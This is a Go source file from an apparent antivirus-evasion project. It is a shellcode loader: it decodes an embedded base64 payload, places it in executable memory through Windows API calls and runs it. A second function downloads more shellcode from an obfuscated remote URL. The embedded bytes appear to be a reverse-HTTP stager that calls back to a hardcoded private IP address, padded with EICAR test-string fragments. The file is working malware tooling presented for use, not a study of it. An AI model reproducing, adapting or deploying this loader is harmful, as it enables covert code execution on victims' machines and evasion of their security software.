package main

import (
	"GolangBypassAV/encry"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	// RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func getCode(key string) []byte {
	xor := encry.Xor{}
	//远程加载
	//Url0:= xor.d("daed8f25d0556d6fd037583947598324928")
	url0 := xor.D(key)

	var CL http.Client
	//_ = exec.Command("calc.exe").Start()
	//下方拼接shellcode文件名到url上
	resp, err := CL.Get(url0 + "x")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		return bodyBytes
	}
	return []byte{}
}

func main() {

	b64body := "DQxXHgwMVx4YzDBceDAwXHXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4I0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceDQ4XHgzMVx4YzlceDQ4XHgzMVx4ZDJceDRkXHgzMVx4YzBceDRkXHgzMVx4YzlceDQxXHg1MFx4NDFceDUwXHg0MVx4YmFceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3M1x4NWFceDQ4XHg4OVx4YzFceDQxXHhiOFx4NTBceDAwXHgwMFx4MDBceDRkXHgzMVx4YzlceDQxXHg1MVx4NDFceDUxXHg2YVx4MDNceDQxXHg1MVx4NDFceGJhXHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NTlceDViXHg0OFx4ODlceGMxXHg0OFx4MzFceGQyXHg0OVx4ODlceGQ4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NDBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NDhceDgzXHhjM1x4NTBceDZhXHgwYVx4NWZceDQ4XHg4OVx4ZjFceDQ4XHg4OVx4ZGFceDQ5XHhjN1x4YzBceGZmXHhmZlx4ZmZceGZmXHg0ZFx4MzFceGM5XHg1Mlx4NTJceDQxXHhiYVx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHgwZlx4ODVceDlkXHgwMVx4MDBceDAwXHg0OFx4ZmZceGNmXHgwZlx4ODRceDhjXHgwMVx4MDBceDAwXHhlYlx4ZDNceGU5XHhlNFx4MDFceDAwXHgwMFx4ZThceGEyXHhmZlx4ZmZceGZmXHgyZlx4NzNceDQ0XHg0ZFx4NTlceDAwXHgzNVx4NGZceDIxXHg1MFx4MjVceDQwXHg0MVx4NTBceDViXHgzNFx4NWNceDUwXHg1YVx4NThceDM1XHgzNFx4MjhceDUwXHg1ZVx4MjlceDM3XHg0M1x4NDNceDI5XHgzN1x4N2RceDI0XHg0NVx4NDlceDQzXHg0MVx4NTJceDJkXHg1M1x4NTRceDQxXHg0ZVx4NDRceDQxXHg1Mlx4NDRceDJkXHg0MVx4NGVceDU0XHg0OVx4NTZceDQ5XHg1Mlx4NTVceDUzXHgyZFx4NTRceDQ1XHg1M1x4NTRceDJkXHg0Nlx4NDlceDRjXHg0NVx4MjFceDI0XHg0OFx4MmJceDQ4XHgyYVx4MDBceDM1XHg0Zlx4MjFceDUwXHgyNVx4MDBceDU1XHg3M1x4NjVceDcyXHgyZFx4NDFceDY3XHg2NVx4NmVceDc0XHgzYVx4MjBceDRkXHg2Zlx4N2FceDY5XHg2Y1x4NmNceDYxXHgyZlx4MzVceDJlXHgzMFx4MjBceDI4XHg2M1x4NmZceDZkXHg3MFx4NjFceDc0XHg2OVx4NjJceDZjXHg2NVx4M2JceDIwXHg0ZFx4NTNceDQ5XHg0NVx4MjBceDM5XHgyZVx4MzBceDNiXHgyMFx4NTdceDY5XHg2ZVx4NjRceDZmXHg3N1x4NzNceDIwXHg0ZVx4NTRceDIwXHgzNlx4MmVceDMxXHgzYlx4MjBceDU3XHg0Zlx4NTdceDM2XHgzNFx4M2JceDIwXHg1NFx4NzJceDY5XHg2NFx4NjVceDZlXHg3NFx4MmZceDM1XHgyZVx4MzBceDNiXHgyMFx4NDJceDRmXHg0OVx4NDVceDM5XHgzYlx4NDVceDRlXHg1NVx4NTNceDI5XHgwZFx4MGFceDAwXHgzNVx4NGZceDIxXHg1MFx4MjVceDQwXHg0MVx4NTBceDViXHgzNFx4NWNceDUwXHg1YVx4NThceDM1XHgzNFx4MjhceDUwXHg1ZVx4MjlceDM3XHg0M1x4NDNceDI5XHgzN1x4N2RceDI0XHg0NVx4NDlceDQzXHg0MVx4NTJceDJkXHg1M1x4NTRceDQxXHg0ZVx4NDRceDQxXHg1Mlx4NDRceDJkXHg0MVx4NGVceDU0XHg0OVx4NTZceDQ5XHg1Mlx4NTVceDUzXHgyZFx4NTRceDQ1XHg1M1x4NTRceDJkXHg0Nlx4NDlceDRjXHg0NVx4MjFceDI0XHg0OFx4MmJceDQ4XHgyYVx4MDBceDM1XHg0Zlx4MjFceDUwXHgyNVx4NDBceDQxXHg1MFx4NWJceDM0XHg1Y1x4NTBceDVhXHg1OFx4MzVceDM0XHgyOFx4NTBceDVlXHgyOVx4MzdceDQzXHg0M1x4MjlceDM3XHg3ZFx4MjRceDQ1XHg0OVx4NDNceDQxXHg1Mlx4MmRceDUzXHg1NFx4NDFceDRlXHg0NFx4NDFceDUyXHg0NFx4MmRceDQxXHg0ZVx4NTRceDQ5XHg1Nlx4NDlceDUyXHg1NVx4NTNceDJkXHg1NFx4NDVceDUzXHg1NFx4MmRceDQ2XHg0OVx4NGNceDQ1XHgyMVx4MjRceDQ4XHgyYlx4NDhceDJhXHgwMFx4MzVceDRmXHgyMVx4NTBceDI1XHg0MFx4NDFceDUwXHg1Ylx4MzRceDVjXHg1MFx4NWFceDU4XHgzNVx4MzRceDI4XHg1MFx4NWVceDI5XHgzN1x4NDNceDQzXHgyOVx4MzdceDdkXHgyNFx4NDVceDQ5XHg0M1x4NDFceDUyXHgyZFx4NTNceDU0XHg0MVx4NGVceDQ0XHg0MVx4NTJceDQ0XHgyZFx4NDFceDRlXHg1NFx4NDlceDU2XHg0OVx4NTJceDU1XHg1M1x4MmRceDU0XHg0NVx4NTNceDU0XHgyZFx4NDZceDQ5XHg0Y1x4NDVceDIxXHgyNFx4NDhceDJiXHg0OFx4MmFceDAwXHgzNVx4NGZceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceDU4XHg0OFx4MDVceDAwXHgwMFx4MDBceDAwXHg1MFx4YzNceGU4XHg5Zlx4ZmRceGZmXHhmZlx4MzFceDM5XHgzMlx4MmVceDMxXHgzNlx4MzhceDJlXHgzMlx4MzJceDM4XHgyZVx4MzFceDMyXHgzOVx4MDBceDAwXHgwMFx4MDBceDAw"
	shellCodeHex := encry.GetShellCode(b64body)
	var charcode = shellCodeHex

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkErr(err)

	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
